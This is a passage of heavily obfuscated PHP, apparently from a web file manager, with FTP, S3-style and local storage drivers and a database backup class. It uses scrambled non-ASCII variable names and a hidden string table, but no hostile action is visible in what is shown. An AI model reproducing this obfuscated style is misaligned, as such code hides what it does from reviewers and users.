$õªÁí¢ => $‚—Õ‚ªì) { $«ÕâğÖÂ[$õªÁí¢] = $this->folderInfo($‚—Õ‚ªì, $ëğñÅô¹); } foreach ($ò÷¨ûˆ as $õªÁí¢ => $‚—Õ‚ªì) { $ò÷¨ûˆ[$õªÁí¢] = $this->fileInfo($‚—Õ‚ªì[$—Ãë’¬Ä[32]], $ëğñÅô¹, $‚—Õ‚ªì); } return array($—Ãë’¬Ä[85] => $«ÕâğÖÂ, $—Ãë’¬Ä[86] => $ò÷¨ûˆ); } public function has($Æ¯¼¨Ÿ¡, $öÛÛÌç× = false, $õÈÕÊÄ = true) { $Û‰¸ìğ¢ =& $_SERVER[¶Ô„œ…¯]; $İß³¹Ö² = $áéôèíÌ = array(); $’»íÌÎ = $öÛÛÌç× ? !0 : !1; $this->fileList($Æ¯¼¨Ÿ¡, $İß³¹Ö², $áéôèíÌ, $’»íÌÎ); if ($öÛÛÌç×) { return array($Û‰¸ìğ¢[241] => count($áéôèíÌ), $Û‰¸ìğ¢[242] => count($İß³¹Ö²)); } if ($õÈÕÊÄ) { if (count($áéôèíÌ)) { return !0; } } else { if (count($İß³¹Ö²)) { return !0; } } return !1; } public function listAll($äè÷¶”Î) { $Âüø–”• =& $_SERVER[¶Ô„œ…¯]; if (!$this->_isconn()) { return !1; } $Ã•‰Û„¯ = $¿Åø¶çš = array(); $this->fileList($äè÷¶”Î, $Ã•‰Û„¯, $¿Åø¶çš, !0); $×ÛçĞ¯Ñ = array_to_keyvalue($¿Åø¶çš, $Âüø–”•[32]); foreach ($Ã•‰Û„¯ as $ıÏä®¸¡) { if (is_string($ıÏä®¸¡)) { $×ÛçĞ¯Ñ[$ıÏä®¸¡] = array($Âüø–”•[79] => 0); } } return $this->listAllFiles($äè÷¶”Î, $×ÛçĞ¯Ñ); } public function getContent($˜ïÓúÏÆ) { if (!$this->_isconn()) { return !1; } $˜ïÓúÏÆ = $this->iconvSystem($˜ïÓúÏÆ); return $this->fileSubstr($˜ïÓúÏÆ); } public function setContent($½©ˆ˜È™, $ª‚ÉÛ¹Ï = '') { if (!$this->_isconn()) { return !1; } $°¹¡ÃóØ = $this->pathThis($this->iconvSystem($½©ˆ˜È™)); $Û‘¢ª¢ = $this->tempFile($°¹¡ÃóØ); file_put_contents($Û‘¢ª¢, $ª‚ÉÛ¹Ï); $§µ¥ŞïÈ = $this->upload($½©ˆ˜È™, $this->iconvApp($Û‘¢ª¢)); $this->tempFileRemve($Û‘¢ª¢); return $§µ¥ŞïÈ; } public function fileSubstr($òÂîµê, $’äë³¤¼ = 0, $¨ŠŒ¹Ì‡ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($òÂîµê, $’äë³¤¼, $¨ŠŒ¹Ì‡); } private function ftpRequest($§º†ìÖ—, $Œàòˆ¹ = 0, $œéñ ©Û = false) { $§º†ìÖ— = $this->iconvSystem($§º†ìÖ—); $ù§•½âë = $this->scheme . $this->host . $_SERVER[¶Ô„œ…¯][4] . $this->port; $…çåÚ•Í = curl_init(); curl_setopt($…çåÚ•Í, CURLOPT_URL, $ù§•½âë . $this->pathEncode($§º†ìÖ—)); curl_setopt($…çåÚ•Í, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($œéñ ©Û) { $ô›’‹Ş’ = $Œàòˆ¹ + $œéñ ©Û - 1; curl_setopt($…çåÚ•Í, CURLOPT_RANGE, "{$Œàòˆ¹}\55{$ô›’‹Ş’}"); } curl_setopt($…çåÚ•Í, CURLOPT_RETURNTRANSFER, 1); $Š¸®Ï÷í = curl_exec($…çåÚ•Í); curl_close($…çåÚ•Í); return $Š¸®Ï÷í; } public function upload($¹Õ¤²½, $–µõıó, $ÄÑß¼õñ = false, $–Ö«”Çï = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¹Õ¤²½))) { return !1; } $¹Õ¤²½ = $this->iconvSystem($¹Õ¤²½); $–µõıó = $this->iconvSystem($–µõıó); $»¥âÌ = ftp_nb_put($this->connect, $¹Õ¤²½, $–µõıó, FTP_BINARY); while ($»¥âÌ == FTP_MOREDATA) { $»¥âÌ = ftp_nb_continue($this->connect); } if ($»¥âÌ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); return !1; } return $this->getPathOuter($¹Õ¤²½); } public function download($·Å«¨ŒÉ, $ñ¹¹è×» = '') { if (!$this->_isconn()) { return !1; } $Í§ĞÃ’ú = $this->pathFather($ñ¹¹è×»); if (!IO::mkdir($Í§ĞÃ’ú)) { return !1; } $·Å«¨ŒÉ = $this->iconvSystem($·Å«¨ŒÉ); $ñ¹¹è×» = $this->iconvSystem($ñ¹¹è×»); $ÜÃÖƒŸÆ = ftp_nb_get($this->connect, $ñ¹¹è×», $·Å«¨ŒÉ, FTP_BINARY); while ($ÜÃÖƒŸÆ == FTP_MOREDATA) { $ÜÃÖƒŸÆ = ftp_nb_continue($this->connect); } if ($ÜÃÖƒŸÆ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); return !1; } return $this->iconvApp($ñ¹¹è×»); } public function exist($¢ÚôÃ•ş) { return $this->isFile($¢ÚôÃ•ş) || $this->isFolder($¢ÚôÃ•ş); } public function isFile($éŒÁèé) { return !$this->isFolder($éŒÁèé) && $this->objectMeta($éŒÁèé); } public function isFolder($ŞÚè¹’£) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][179], $ŞÚè¹’£); } protected function objectMeta($Ú‹Íû¹Ÿ) { return $this->cacheMethod($_SERVER[¶Ô„œ…¯][181], $Ú‹Íû¹Ÿ); } protected function _objectMeta($ÓƒëÏà§) { $ŸÙåßÒ‚ =& $_SERVER[¶Ô„œ…¯]; if ($ÓƒëÏà§ == $ŸÙåßÒ‚[12] || $ÓƒëÏà§ == $ŸÙåßÒ‚[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ÓƒëÏà§ = $this->iconvSystem($ÓƒëÏà§); $’”ìîü = array($ŸÙåßÒ‚[32] => $this->iconvApp($ÓƒëÏà§), $ŸÙåßÒ‚[33] => $ŸÙåßÒ‚[232], $ŸÙåßÒ‚[79] => 0); @ftp_chdir($this->connect, $ŸÙåßÒ‚[8]); $üˆÑ”†ó = @ftp_size($this->connect, $ÓƒëÏà§); if ($üˆÑ”†ó != -1) { $’”ìîü[$ŸÙåßÒ‚[79]] = $üˆÑ”†ó; } else { $ûôºÏÛ = @ftp_chdir($this->connect, $ÓƒëÏà§); if (!$ûôºÏÛ) { return !1; } $’”ìîü[$ŸÙåßÒ‚[33]] = $ŸÙåßÒ‚[78]; } return $’”ìîü; } protected function _isFolder($œãøòçİ) { $ÊÁ†“ƒ¾ =& $_SERVER[¶Ô„œ…¯]; if ($œãøòçİ == $ÊÁ†“ƒ¾[12] || $œãøòçİ == $ÊÁ†“ƒ¾[8]) { return !0; } $¬·‡ÓÑ = $this->_objectMeta($œãøòçİ); return isset($¬·‡ÓÑ[$ÊÁ†“ƒ¾[33]]) && $¬·‡ÓÑ[$ÊÁ†“ƒ¾[33]] == $ÊÁ†“ƒ¾[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ËÆ®Ğşœ) { parent::__construct($ËÆ®Ğşœ); $this->setSignVersion($_SERVER[¶Ô„œ…¯][249]); } public function uploadLink($è§Ô½ÄŒ, $üÅìÕ•õ = 0) { $£©¿êöˆ =& $_SERVER[¶Ô„œ…¯]; if ($this->isUploadServer()) { return; } $ŞıòÚ×™ = $this->getType(); if (!in_array($ŞıòÚ×™, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $é§—ã· = (!$üÅìÕ•õ ? 1 : ceil($üÅìÕ•õ / pow(1024, 3))) * 3600 * 4; $‡Ì‰µÍ = $this->uploadMultiData($è§Ô½ÄŒ, $é§—ã·); if ($‡Ì‰µÍ) { $‡Ì‰µÍ[$£©¿êöˆ[97]] = $è§Ô½ÄŒ; $‡Ì‰µÍ[$£©¿êöˆ[98]] = $ŞıòÚ×™; } return $‡Ì‰µÍ; } public function fileOutImage($¦·ã«‡, $„½öğñĞ = 250) { if ($this->size($¦·ã«‡) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¦·ã«‡, $„½öğñĞ); } $—Ëö³õ± = $this->link($¦·ã«‡); $—Ëö³õ± .= $_SERVER[¶Ô„œ…¯][1462] . $„½öğñĞ; $this->fileOutLink($—Ëö³õ±); } public function fileOutLink($‚Şª°§í) { $È¢Øûå· =& $_SERVER[¶Ô„œ…¯]; if (substr($‚Şª°§í, 0, 7) == $È¢Øûå·[218]) { $‚Şª°§í = $È¢Øûå·[219] . substr($‚Şª°§í, 7); } header($È¢Øûå·[175] . $‚Şª°§í); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ñ¨¬«ì‚) { if (substr($ñ¨¬«ì‚, 0, 2) == $_SERVER[¶Ô„œ…¯][1418]) { $ñ¨¬«ì‚ = BASIC_PATH . substr($ñ¨¬«ì‚, 2); } return $ñ¨¬«ì‚; } public function iconvApp($À¿î®³) { $¦ÆÔ‘ =& $_SERVER[¶Ô„œ…¯]; global $config; return $this->iconvTo($À¿î®³, $config[$¦ÆÔ‘[1448]], $config[$¦ÆÔ‘[1447]]); } public function iconvSystem($ˆ¬õ©ÏÛ) { $úï¼¥ÃÎ =& $_SERVER[¶Ô„œ…¯]; global $config; return $this->iconvTo($ˆ¬õ©ÏÛ, $config[$úï¼¥ÃÎ[1447]], $config[$úï¼¥ÃÎ[1448]]); } public function getPathOuter($ï–È§à¾) { $İºú¢õŸ =& $_SERVER[¶Ô„œ…¯]; $À¶öçó = $this->iconvApp($this->pathBase); $ï–È§à¾ = $this->iconvApp($ï–È§à¾); if (substr($À¶öçó, 0, 2) == $İºú¢õŸ[1418]) { $À¶öçó = BASIC_PATH . substr($À¶öçó, 2); } if (substr($ï–È§à¾, 0, 2) == $İºú¢õŸ[1418]) { $ï–È§à¾ = BASIC_PATH . substr($ï–È§à¾, 2); } $À¶öçó = KodIO::clear($À¶öçó); $ï–È§à¾ = KodIO::clear($ï–È§à¾); $ï–È§à¾ = substr($ï–È§à¾, strlen($À¶öçó)); if (empty($this->pathDriver)) { return $ï–È§à¾; } return $this->pathDriver . $İºú¢õŸ[8] . ltrim($ï–È§à¾, $İºú¢õŸ[8]); } public function mkfile($Äë½ˆœ¾, $©â”ØÁŒ = '', $ÆÏ§ªÕÉ = REPEAT_RENAME) { $Äë½ˆœ¾ = $this->iconvSystem($Äë½ˆœ¾); @touch($Äë½ˆœ¾); if ($©â”ØÁŒ) { file_put_contents($Äë½ˆœ¾, $©â”ØÁŒ); } @chmod($Äë½ˆœ¾, $this->pathAuth); if (is_file($Äë½ˆœ¾)) { return $this->getPathOuter($Äë½ˆœ¾); } $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); return !1; } public function mkdir($¤‘ÖÛ³È, $ëËŒ²»ù = REPEAT_SKIP) { $¤‘ÖÛ³È = $this->iconvSystem($¤‘ÖÛ³È); if (is_dir($¤‘ÖÛ³È)) { return $this->getPathOuter($¤‘ÖÛ³È); } @mkdir($¤‘ÖÛ³È, $this->pathAuth, !0); @chmod($¤‘ÖÛ³È, $this->pathAuth); if (is_dir($¤‘ÖÛ³È)) { return $this->getPathOuter($¤‘ÖÛ³È); } $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); return !1; } public function copyFile($ççŒÜ , $®§ÙéÊ™) { $this->mkdir($this->pathFather($®§ÙéÊ™)); $ççŒÜ  = $this->iconvSystem($ççŒÜ ); $®§ÙéÊ™ = $this->iconvSystem($®§ÙéÊ™); $üµÅŞ„× = copy_64($ççŒÜ , $®§ÙéÊ™); @chmod($®§ÙéÊ™, $this->pathAuth); if ($üµÅŞ„×) { return $this->getPathOuter($®§ÙéÊ™); } $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); return !1; } public function moveFile($ğä·®›–, $£”îçÊ») { $this->mkdir($this->pathFather($£”îçÊ»)); $ğä·®›– = $this->iconvSystem($ğä·®›–); $£”îçÊ» = $this->iconvSystem($£”îçÊ»); $–•ºÃá = intval(@rename($ğä·®›–, $£”îçÊ»)); if (!$–•ºÃá) { if ($–•ºÃá = intval(@copy_64($ğä·®›–, $£”îçÊ»))) { @unlink($ğä·®›–); } } @chmod($£”îçÊ», $this->pathAuth); if ($–•ºÃá) { return $this->getPathOuter($£”îçÊ»); } $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); return !1; } public function movePath($³«µı­±, $ÚÉÕ”¶ò, $çáÅ€µ = false) { $‚ëß’•Ê =& $_SERVER[¶Ô„œ…¯]; $³«µı­± = $this->iconvSystem($³«µı­±); $ÚÉÕ”¶ò = $this->iconvSystem($ÚÉÕ”¶ò); $Äœã‹éñ = rtrim($ÚÉÕ”¶ò, $‚ëß’•Ê[8]) . $‚ëß’•Ê[8] . ($çáÅ€µ ? $çáÅ€µ : get_path_this($³«µı­±)); if (file_exists($Äœã‹éñ)) { return !1; } $¢Ê§ÆŒ = intval(@rename($³«µı­±, $Äœã‹éñ)); $¢Ê§ÆŒ = file_exists($Äœã‹éñ); if ($¢Ê§ÆŒ) { return $this->getPathOuter($Äœã‹éñ); } $this->writeLog(__FUNCTION__ . $‚ëß’•Ê[1459], !0); return !1; } public function delFile($ãÉ”¨§„) { $ãÉ”¨§„ = $this->iconvSystem($ãÉ”¨§„); if (!@unlink($ãÉ”¨§„)) { @chmod($ãÉ”¨§„, $this->pathAuth); if (@unlink($ãÉ”¨§„)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); return !1; } return !0; } public function delFolder($úıâ“‘Â) { $„ğ×é“¤ =& $_SERVER[¶Ô„œ…¯]; $úıâ“‘Â = $this->iconvSystem($úıâ“‘Â); if (!is_dir($úıâ“‘Â)) { return !0; } if (!($óØú® = opendir($úıâ“‘Â))) { return !1; } while (($ùÛÌËáÈ = readdir($óØú®)) !== !1) { if ($ùÛÌËáÈ == $„ğ×é“¤[10] || $ùÛÌËáÈ == $„ğ×é“¤[1370]) { continue; } $®·ûèğ¿ = $úıâ“‘Â . $„ğ×é“¤[8] . $ùÛÌËáÈ; if (is_file($®·ûèğ¿) || is_link($®·ûèğ¿)) { if (!unlink($®·ûèğ¿)) { chmod($®·ûèğ¿, $this->pathAuth); if (!unlink($®·ûèğ¿)) { return !1; } } } else { if (is_dir($®·ûèğ¿)) { chmod($®·ûèğ¿, $this->pathAuth); $®·ûèğ¿ = $this->iconvApp($®·ûèğ¿); if (!$this->delFolder($®·ûèğ¿)) { return !1; } } } } closedir($óØú®); return rmdir($úıâ“‘Â); } public function rename($ş­ïğÑÛ, $Ïä×¿¶Ö) { $İ¸ îóÅ =& $_SERVER[¶Ô„œ…¯]; $’áµ‰Æ = $this->fileNameAuto($this->pathFather($ş­ïğÑÛ), $Ïä×¿¶Ö); $’áµ‰Æ = $this->iconvSystem($’áµ‰Æ); $ş­ïğÑÛ = $this->iconvSystem($ş­ïğÑÛ); $ï•Ü Éñ = $this->pathFather($ş­ïğÑÛ); $Âå“¨  = rtrim($ï•Ü Éñ, $İ¸ îóÅ[8]) . $İ¸ îóÅ[8] . $’áµ‰Æ; $ĞØ¢‰ï = @rename($ş­ïğÑÛ, $Âå“¨ ); $Âå“¨  = $this->iconvApp($Âå“¨ ); if ($ĞØ¢‰ï) { return $this->getPathOuter($Âå“¨ ); } $this->writeLog(__FUNCTION__ . $İ¸ îóÅ[1459], !0); return !1; } public function size($†¤ø¯ÃÉ) { $†¤ø¯ÃÉ = $this->iconvSystem($†¤ø¯ÃÉ); return filesize_64($†¤ø¯ÃÉ); } public function info($ÎİœÕ¥ì) { $ÎİœÕ¥ì = $this->iconvSystem($ÎİœÕ¥ì); if ($this->isFolder($ÎİœÕ¥ì)) { return $this->folderInfo($ÎİœÕ¥ì); } else { if ($this->isFile($ÎİœÕ¥ì)) { return $this->fileInfo($ÎİœÕ¥ì); } } return !1; } protected function infoChildren($‡‘Üù¶, &$øÍÊƒ‘·, $à¯¹µš = true) { $Şö·ä©î =& $_SERVER[¶Ô„œ…¯]; check_abort_echo(); $‡‘Üù¶ = rtrim($‡‘Üù¶, $Şö·ä©î[8]) . $Şö·ä©î[8]; if ($à¯¹µš) { $‡‘Üù¶ = $this->iconvSystem($‡‘Üù¶); } if (!($¥º·’ = @opendir($‡‘Üù¶))) { return; } while (($·İË•ŒÜ = readdir($¥º·’)) !== !1) { if ($·İË•ŒÜ == $Şö·ä©î[10] || $·İË•ŒÜ == $Şö·ä©î[1370]) { continue; } $œİ›¡­Û = $‡‘Üù¶ . $·İË•ŒÜ; if (is_file($œİ›¡­Û) || is_link($œİ›¡­Û)) { $øÍÊƒ‘·[$Şö·ä©î[80]]++; $øÍÊƒ‘·[$Şö·ä©î[79]] += filesize_64($œİ›¡­Û); } else { if (is_dir($œİ›¡­Û)) { $øÍÊƒ‘·[$Şö·ä©î[81]]++; $this->infoChildren($œİ›¡­Û, $øÍÊƒ‘·, !1); } } } closedir($¥º·’); } private function folderInfo($»¤ÊöËÀ, $¿è›Şôî = false) { $Æ’å±Òù =& $_SERVER[¶Ô„œ…¯]; $»¤ÊöËÀ = rtrim($»¤ÊöËÀ, $Æ’å±Òù[8]) . $Æ’å±Òù[8]; $®ÇÍ¢Ú = $this->iconvApp($this->pathThis($»¤ÊöËÀ)); if ($¿è›Şôî) { return array($Æ’å±Òù[32] => $®ÇÍ¢Ú, $Æ’å±Òù[87] => $this->getPathOuter($»¤ÊöËÀ), $Æ’å±Òù[33] => $Æ’å±Òù[78]); } $“ØÄ„¾ = array($Æ’å±Òù[32] => $®ÇÍ¢Ú, $Æ’å±Òù[87] => $this->getPathOuter($»¤ÊöËÀ), $Æ’å±Òù[33] => $Æ’å±Òù[78], $Æ’å±Òù[233] => @filectime($»¤ÊöËÀ), $Æ’å±Òù[88] => @filemtime($»¤ÊöËÀ), $Æ’å±Òù[1463] => @fileatime($»¤ÊöËÀ), $Æ’å±Òù[1464] => is_readable($»¤ÊöËÀ), $Æ’å±Òù[1465] => is_writable($»¤ÊöËÀ), $Æ’å±Òù[1466] => get_mode($»¤ÊöËÀ)); return $“ØÄ„¾; } private function fileInfo($¸ËÕ¥Ë, $Â­½úş‹ = false) { $òíşÍË =& $_SERVER[¶Ô„œ…¯]; $•Í‡ÆÀë = $this->iconvApp($this->pathThis($¸ËÕ¥Ë)); if ($Â­½úş‹) { return array($òíşÍË[32] => $•Í‡ÆÀë, $òíşÍË[87] => $this->getPathOuter($¸ËÕ¥Ë), $òíşÍË[33] => $òíşÍË[232], $òíşÍË[79] => $this->size($¸ËÕ¥Ë), $òíşÍË[169] => $this->ext($•Í‡ÆÀë)); } $ŒâèÄ¨ï = array($òíşÍË[32] => $•Í‡ÆÀë, $òíşÍË[87] => $this->getPathOuter($¸ËÕ¥Ë), $òíşÍË[33] => $òíşÍË[232], $òíşÍË[233] => @filectime($¸ËÕ¥Ë), $òíşÍË[88] => @filemtime($¸ËÕ¥Ë), $òíşÍË[1463] => @fileatime($¸ËÕ¥Ë), $òíşÍË[79] => $this->size($¸ËÕ¥Ë), $òíşÍË[169] => $this->ext($•Í‡ÆÀë), $òíşÍË[1464] => is_readable($¸ËÕ¥Ë), $òíşÍË[1465] => is_writable($¸ËÕ¥Ë), $òíşÍË[1466] => get_mode($¸ËÕ¥Ë)); return $ŒâèÄ¨ï; } public function exist($å‘š¨û) { $å‘š¨û = $this->iconvSystem($å‘š¨û); return @file_exists($å‘š¨û); } public function isFile($ØéñÈë ) { $ØéñÈë  = $this->iconvSystem($ØéñÈë ); return @is_file($ØéñÈë ); } public function isFolder($¦“óªëï) { $¦“óªëï = $this->iconvSystem($¦“óªëï); return @is_dir($¦“óªëï); } public function listPath($»İÛÛšÇ, $Û¨³™²‰ = false) { $€Í£ßû‡ =& $_SERVER[¶Ô„œ…¯]; $»İÛÛšÇ = $this->iconvSystem($»İÛÛšÇ); $»İÛÛšÇ = rtrim($»İÛÛšÇ, $€Í£ßû‡[8]) . $€Í£ßû‡[8]; $ÄË«Ï¬ = array($€Í£ßû‡[85] => array(), $€Í£ßû‡[86] => array()); if (!($Ø¨Å™³› = @opendir($»İÛÛšÇ))) { return $ÄË«Ï¬; } while (($ŞÜ÷†â = readdir($Ø¨Å™³›)) !== !1) { if ($ŞÜ÷†â == $€Í£ßû‡[10] || $ŞÜ÷†â == $€Í£ßû‡[1370]) { continue; } $åÍÙÊÛÌ = $»İÛÛšÇ . $ŞÜ÷†â; if (is_file($åÍÙÊÛÌ)) { $ÄË«Ï¬[$€Í£ßû‡[86]][] = $this->fileInfo($åÍÙÊÛÌ, $Û¨³™²‰); } else { $ÄË«Ï¬[$€Í£ßû‡[85]][] = $this->folderInfo($åÍÙÊÛÌ, $Û¨³™²‰); } } closedir($Ø¨Å™³›); return $ÄË«Ï¬; } public function listAll($Ì¨ÙÀúˆ, &$Á†Ö¾à = array()) { $ÍÓ‘µ˜¦ =& $_SERVER[¶Ô„œ…¯]; $Ì¨ÙÀúˆ = $this->iconvSystem($Ì¨ÙÀúˆ); $Ì¨ÙÀúˆ = rtrim($Ì¨ÙÀúˆ, $ÍÓ‘µ˜¦[8]) . $ÍÓ‘µ˜¦[8]; if (!($’Ãù¥Ó³ = @opendir($Ì¨ÙÀúˆ))) { return $Á†Ö¾à; } while (($ì¹®ïşü = readdir($’Ãù¥Ó³)) !== !1) { if ($ì¹®ïşü == $ÍÓ‘µ˜¦[10] || $ì¹®ïşü == $ÍÓ‘µ˜¦[1370]) { continue; } $Õé‹æî = $Ì¨ÙÀúˆ . $ì¹®ïşü; $‚ñÀ¼¨ = is_dir($Õé‹æî) && !is_link($Õé‹æî) ? 1 : 0; $Õé‹æî = $‚ñÀ¼¨ ? $Õé‹æî . $ÍÓ‘µ˜¦[8] : $Õé‹æî; $Á†Ö¾à[] = array($ÍÓ‘µ˜¦[87] => $Õé‹æî, $ÍÓ‘µ˜¦[78] => $‚ñÀ¼¨, $ÍÓ‘µ˜¦[88] => intval(@filemtime($Õé‹æî)), $ÍÓ‘µ˜¦[79] => $‚ñÀ¼¨ ? 0 : intval($this->size($Õé‹æî))); if ($‚ñÀ¼¨) { $this->listAll($Õé‹æî, $Á†Ö¾à); } } closedir($’Ãù¥Ó³); return $Á†Ö¾à; } public function has($¸íñ×íï, $ª‡…¹Ÿ« = false, $¥ŒËı³§ = true) { $œ÷ÚÇÉ =& $_SERVER[¶Ô„œ…¯]; $¸íñ×íï = $this->iconvSystem($¸íñ×íï); $¸íñ×íï = rtrim($¸íñ×íï, $œ÷ÚÇÉ[8]) . $œ÷ÚÇÉ[8]; if (!($Ö§’¥ö€ = @opendir($¸íñ×íï))) { return !1; } $²”¯ë‹Ç = 0; $ş§ÍĞ³ = 0; $ó÷ßŸ„Ë = 0; while (($ŞÍ‡’” = readdir($Ö§’¥ö€)) !== !1) { if ($ŞÍ‡’” == $œ÷ÚÇÉ[10] || $ŞÍ‡’” == $œ÷ÚÇÉ[1370]) { continue; } $£¸¢Îó¶ = $¸íñ×íï . $ŞÍ‡’”; if ($ª‡…¹Ÿ«) { $ó÷ßŸ„Ë++; if (@is_file($£¸¢Îó¶)) { $²”¯ë‹Ç++; } else { $ş§ÍĞ³++; } if ($ó÷ßŸ„Ë > 10000) { break; } continue; } if ($¥ŒËı³§) { if (@is_file($£¸¢Îó¶)) { return !0; } } else { if (@is_dir($£¸¢Îó¶ . $œ÷ÚÇÉ[8])) { return !0; } } } closedir($Ö§’¥ö€); if ($ª‡…¹Ÿ«) { return array($œ÷ÚÇÉ[241] => $²”¯ë‹Ç, $œ÷ÚÇÉ[242] => $ş§ÍĞ³); } return !1; } public function hashSimple($ûö»Ê²) { $åàç´ü´ =& $_SERVER[¶Ô„œ…¯]; if (!$ûö»Ê²) { return md5($åàç´ü´[12]); } $ûö»Ê² = $this->iconvSystem($ûö»Ê²); $Õˆ¯¸›Â = $this->size($ûö»Ê²); $öŒ»Š›³ = 200; $®ÑÓàåş = 50; if ($Õˆ¯¸›Â <= $öŒ»Š›³ * $®ÑÓàåş) { return $this->hashMd5($ûö»Ê²) . $Õˆ¯¸›Â; } $¥×¹·ß = $åàç´ü´[12]; $œ†µĞÏ€ = intval($Õˆ¯¸›Â / $®ÑÓàåş); $ÄŞ™Ìå = fopen($ûö»Ê², $åàç´ü´[1467]); if (!$ÄŞ™Ìå) { return $¥×¹·ß; } for ($ªÔÄˆí = 0; $ªÔÄˆí < $®ÑÓàåş; $ªÔÄˆí++) { fseek_64($ÄŞ™Ìå, $œ†µĞÏ€ * $ªÔÄˆí); $¥×¹·ß .= fread($ÄŞ™Ìå, $öŒ»Š›³); } fseek_64($ÄŞ™Ìå, $Õˆ¯¸›Â - $öŒ»Š›³); $¥×¹·ß .= fread($ÄŞ™Ìå, $öŒ»Š›³); fclose($ÄŞ™Ìå); return md5($¥×¹·ß) . $Õˆ¯¸›Â; } public function getContent($İ¼¬ö¶Ï) { $İ¼¬ö¶Ï = $this->iconvSystem($İ¼¬ö¶Ï); return file_get_contents($İ¼¬ö¶Ï); } public function setContent($Å·û±„Ş, $»­Œ–©Ë = '') { $Å·û±„Ş = $this->iconvSystem($Å·û±„Ş); $ùş“€Ì„ = @file_put_contents($Å·û±„Ş, $»­Œ–©Ë, LOCK_EX); if (!$ùş“€Ì„) { $this->writeLog(__FUNCTION__ . $_SERVER[¶Ô„œ…¯][1459], !0); } clearstatcache(); @chmod($Å·û±„Ş, $this->pathAuth); return $ùş“€Ì„ === !1 ? !1 : !0; } public function fileSubstr($¶êÀ¦½Å, $ ½±›¾ö = 0, $Ú¡ïÈÜ® = false) { $¾ÔÓÓ¦š =& $_SERVER[¶Ô„œ…¯]; $¶êÀ¦½Å = $this->iconvSystem($¶êÀ¦½Å); if ($Ú¡ïÈÜ® === !1) { $Ú¡ïÈÜ® = $this->size($¶êÀ¦½Å); } if ($Ú¡ïÈÜ® <= 0) { return $¾ÔÓÓ¦š[12]; } $…‡š®Ûü = fopen($¶êÀ¦½Å, $¾ÔÓÓ¦š[1467]); if (!$…‡š®Ûü) { return !1; } fseek_64($…‡š®Ûü, $ ½±›¾ö); $ÃÖƒ¾Ÿ = fread($…‡š®Ûü, $Ú¡ïÈÜ®); fclose($…‡š®Ûü); if (!$ÃÖƒ¾Ÿ) { $this->writeLog(__FUNCTION__ . $¾ÔÓÓ¦š[1459], !0); } return $ÃÖƒ¾Ÿ; } public function upload($ÕÉÜÆ…, $ìÜË©·, $»ÃÖÛˆ = false, $É´ş´¢³ = REPEAT_REPLACE) { if ($»ÃÖÛˆ) { return $this->moveFile($ìÜË©·, $ÕÉÜÆ…); } return $this->copyFile($ìÜË©·, $ÕÉÜÆ…); } public function setModifyTime($¢ëÙŠŠ, $˜¼ÑÀ¢Ò = '') { @touch($¢ëÙŠŠ, intval($˜¼ÑÀ¢Ò)); } public function download($ïú««¶´, $™ŒÛ–„‹) { return $this->iconvSystem($ïú««¶´); } } goto dÖ›ËË; cŸÃ©°Ï: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¬Ää—‰Æ =& $_SERVER[¶Ô„œ…¯]; $»¦‹¢â¿ = Backup::get(); self::$io = $»¦‹¢â¿[$¬Ää—‰Æ[830]]; self::$name = $»¦‹¢â¿[$¬Ää—‰Æ[32]]; $Æêûà = new DbManage(); $¨Äşö¤© = $Æêûà->dbType(); $õºöší = array($¬Ää—‰Æ[855] => $¨Äşö¤©, $¬Ää—‰Æ[856] => time()); Backup::set($õºöší); $€¾êä… = $this->tmpFilesPath() . $¬Ää—‰Æ[857] . self::$name . $¬Ää—‰Æ[8]; del_dir($€¾êä…); mk_dir($€¾êä…); $à¯è—Ş† = $È‰—ä¦ß = 0; try { $·Ò¿¤œ = $Æêûà->db()->getTables(); } catch (Exception $á®×—î¤) { return !1; } $·Ò¿¤œ = array_diff($·Ò¿¤œ, array($¬Ää—‰Æ[858], $¬Ää—‰Æ[859])); foreach ($·Ò¿¤œ as $†§™¦ô¹) { if ($†§™¦ô¹ == $¬Ää—‰Æ[860]) { continue; } $à¯è—Ş† += $Æêûà->model($†§™¦ô¹)->count(); } $Æ×Åø« = new Task($¬Ää—‰Æ[861], $¬Ää—‰Æ[862], $à¯è—Ş†, LNG($¬Ää—‰Æ[863]) . $¬Ää—‰Æ[864] . LNG($¬Ää—‰Æ[865])); $GLOBALS[$¬Ää—‰Æ[866]] = self::$name; foreach ($·Ò¿¤œ as $†§™¦ô¹) { $Î£¦•øØ = $€¾êä… . $†§™¦ô¹ . $¬Ää—‰Æ[867]; if ($†§™¦ô¹ == $¬Ää—‰Æ[860]) { @touch($Î£¦•øØ); continue; } $®é‚·»­ = null; if ($†§™¦ô¹ == $¬Ää—‰Æ[868] && $»¦‹¢â¿[$¬Ää—‰Æ[171]] == $¬Ää—‰Æ[854]) { $®é‚·»­ = self::$io; } $È‰—ä¦ß += $Æêûà->sqlFromDb($†§™¦ô¹, $Î£¦•øØ, $Æ×Åø«, $®é‚·»­); } unset($GLOBALS[$¬Ää—‰Æ[866]]); $Æ×Åø«->end(); if ($È‰—ä¦ß > $à¯è—Ş†) { $à¯è—Ş† = $È‰—ä¦ß; } $õºöší = array($¬Ää—‰Æ[855] => $¨Äşö¤©, $¬Ää—‰Æ[851] => 1, $¬Ää—‰Æ[869] => $à¯è—Ş†, $¬Ää—‰Æ[870] => $È‰—ä¦ß, $¬Ää—‰Æ[871] => 